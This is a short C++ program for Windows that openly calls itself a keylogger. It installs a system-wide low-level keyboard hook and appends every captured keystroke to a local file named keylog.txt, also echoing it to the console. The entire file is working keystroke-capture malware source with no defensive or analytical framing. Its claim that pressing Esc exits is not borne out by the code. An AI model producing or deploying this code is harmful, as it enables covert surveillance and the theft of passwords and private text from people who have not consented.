#include <iostream>
#include <fstream>
#include <Windows.h>

std::ofstream logfile;

void write_to_log(const std::string& key) {
    logfile.open("keylog.txt", std::ios_base::app);
    logfile << key;
    logfile.close();
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT *pKey = (KBDLLHOOKSTRUCT *)lParam;
        DWORD key = pKey->vkCode;
        if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && key != VK_ESCAPE) {
            char buffer[256] = { 0 };
            DWORD msg = 0;
            msg = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
            if (msg != 0) {
                std::string str = std::string(1, (char)msg);
                write_to_log(str);
                std::cout << str;
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void InstallHook() {
    HHOOK hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG message;
    while (GetMessage(&message, NULL, 0, 0)) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(hKeyHook);
}

int main() {
    std::cout << "Keylogger started. Press 'Esc' to exit." << std::endl;
    logfile.open("keylog.txt", std::ios_base::app);
    logfile.close();
    InstallHook();
    return 0;
}

